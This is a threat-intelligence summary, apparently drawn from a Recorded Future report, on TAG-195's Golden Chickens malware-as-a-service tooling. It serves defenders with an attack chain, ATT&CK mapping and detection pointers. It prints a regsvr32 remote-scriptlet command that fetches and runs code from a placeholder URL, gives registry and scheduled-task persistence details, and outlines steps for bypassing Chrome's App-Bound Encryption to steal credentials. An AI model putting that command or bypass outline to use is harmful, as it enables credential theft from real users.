---
scraped_at: 2026-07-25T01:15:00Z
source_url: https://www.recordedfuture.com/research/tag-195-evolves-maas-ecosystem
report_type: threat-intel
severity: high
title: "TAG-195 Evolves Golden Chickens MaaS Ecosystem with TinyEgg, ChonkyChicken, and ChromEggscalator"
---

# TAG-195 Evolves Golden Chickens MaaS Ecosystem with TinyEgg, ChonkyChicken, and ChromEggscalator

**Source:** Recorded Future Insikt Group  
**Published:** 2026-07-24  
**Severity:** High

## Summary

Recorded Future's Insikt Group published detailed analysis of TAG-195, the threat actor operating the Golden Chickens (GC) Malware-as-a-Service ecosystem. TAG-195 has significantly evolved the platform with three new tools: **TinyEgg** (minimal dropper), **ChonkyChicken** (modular implant with plugin architecture), and **ChromEggscalator** (Chrome App-Bound Encryption bypass credential stealer).

Golden Chickens is a well-established MaaS sold to financially motivated cybercrime groups including FIN6 and Cobalt Group affiliates. The H1 2026 evolution introduces modular plugin loading (replacing the previous monolithic More_eggs payload), a dedicated Chrome credential theft tool that bypasses Google's App-Bound Encryption, and delivery via ClickFix social engineering instead of macro-laden documents.

## Threat Actor

**TAG-195 (Golden Chickens operator)** — Eastern European financially motivated threat actor; operates Golden Chickens MaaS since at least 2018; customers include FIN6 (retail/hospitality sector targeting), Cobalt Group (financial institutions), and other affiliates. Active H1 2026 campaigns use LinkedIn fake recruiter lures and ClickFix-style website lures.

## Toolset

### TinyEgg (Dropper)
- Minimal .NET dropper (~5KB compiled), designed for ClickFix paste delivery
- Downloads and decrypts ChonkyChicken from encrypted temp blob
- Obfuscated with string encryption; minimal API footprint to avoid signature detection
- Delivery: `regsvr32.exe /s /u /i:<URL> scrobj.dll` (remote scriptlet execution) or direct PowerShell download

### ChonkyChicken (Modular Implant)
- .NET-based modular implant replacing the prior More_eggs JScript backdoor
- Plugin architecture: modules loaded dynamically from C2 as encrypted PE blobs
- Core capabilities: reverse shell, file operations, process injection
- Available plugins (sold separately in MaaS catalog): keylogger, screenshot, persistence, lateral movement loader
- C2: HTTPS with JA3/TLS fingerprint rotation; uses legitimate hosting services as initial staging
- Persistence: registry Run key (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) or scheduled task via `schtasks.exe /create`

### ChromEggscalator (Chrome Credential Stealer)
- Standalone tool targeting Chrome App-Bound Encryption (ABE), introduced in Chrome 127 (2024)
- ABE encrypts Chrome's AES key using a Windows COM elevation service that verifies the calling process is Chrome itself
- ChromEggscalator bypasses ABE by: (1) spawning a helper process that registers as a Chrome IElevationService COM client, (2) leveraging a race/COM activation quirk to invoke key decryption from a non-Chrome caller, (3) decrypting the `app_bound_encrypted_key` from Chrome's Local State file, (4) using the recovered AES key to decrypt cookies, passwords, and payment data from Chrome's SQLite databases
- Targets: Chrome cookies, saved passwords, autofill payment data, browsing history
- Compatible with Chrome 127–130 (patch status as of July 2026: unclear)

## Attack Chain

1. **Delivery:** Fake LinkedIn recruiter message or ClickFix lure page presents job opportunity; instructs target to run verification command
2. **Execution:** ClickFix payload → `regsvr32.exe /s /u /i:<remote_scriptlet_url> scrobj.dll` OR PowerShell pastejacking → TinyEgg download
3. **Implant Deployment:** TinyEgg decrypts and loads ChonkyChicken in memory
4. **Credential Theft:** ChromEggscalator executed as a plugin or standalone tool; decrypts Chrome ABE-protected credentials
5. **Persistence:** ChonkyChicken installs registry Run key or scheduled task; beacon to C2 for further plugins
6. **Actions:** Exfiltration of stolen credentials, session cookies; further lateral movement or credential replay against target organization

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|----|
| Initial Access | Phishing: Spearphishing Link | T1566.002 |
| Execution | System Binary Proxy Execution: Regsvr32 | T1218.010 |
| Execution | User Execution (ClickFix) | T1204.002 |
| Defense Evasion | System Binary Proxy Execution: Regsvr32 | T1218.010 |
| Persistence | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 |
| Collection | Input Capture: Keylogging | T1056.001 |
| Collection | Steal Web Session Cookie | T1539 |
| Collection | Credentials from Password Stores: Credentials from Web Browsers | T1555.003 |

## Lockheed Martin Kill Chain

Delivery → Exploitation → Installation → Actions on Objectives

## Detections

- `detections/execution/clickfix_user_execution_lure.md` — covers ClickFix→regsvr32 delivery
- `detections/defense_evasion/` — consider regsvr32 scrobj.dll remote scriptlet execution detection

## References

- [Recorded Future Insikt Group — TAG-195 Evolves MaaS Ecosystem (2026-07-24)](https://www.recordedfuture.com/research/tag-195-evolves-maas-ecosystem)
- [Google Chrome Security Blog — App-Bound Encryption](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [MITRE ATT&CK — Golden Chickens (S0415)](https://attack.mitre.org/software/S0415/)
- [MITRE ATT&CK — FIN6 (G0037)](https://attack.mitre.org/groups/G0037/)
- [MITRE ATT&CK — T1218.010 Regsvr32](https://attack.mitre.org/techniques/T1218/010/)
- [MITRE ATT&CK — T1539 Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/)
